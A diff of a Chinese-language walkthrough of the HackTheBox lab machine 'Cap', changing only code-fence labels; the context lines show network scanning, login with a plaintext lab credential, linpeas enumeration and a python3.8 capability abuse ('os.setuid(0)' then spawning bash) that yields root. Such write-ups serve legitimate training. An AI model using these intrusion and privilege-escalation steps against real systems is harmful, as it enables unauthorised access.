@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 资产探测
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.10.245
 ......
@@ -58,7 +58,7 @@ OS details: Linux 4.15 - 5.19
 
 尝试进行目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch -u 10.10.10.245
 [20:24:45] Starting:
@@ -102,7 +102,7 @@ nathan:Buck3tH4TF0RM3!
 
 尝试使用获得的凭据进行登录
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ ftp nathan@10.10.10.245
 Connected to 10.10.10.245.
@@ -137,7 +137,7 @@ lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
 
 使用FTP的凭据也可以登录SSH
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ ssh nathan@10.10.10.245
 ......
@@ -149,7 +149,7 @@ nathan
 
 上传`linpeass.sh`自动化探测
 
-```shell
+```bash
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 3.0a
@@ -169,7 +169,7 @@ Files with capabilities (limited to 50):
 
 尝试加以利用
 
-```shell
+```bash
 (remote) nathan@cap:/tmp$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 root@cap:/tmp# whoami
 root
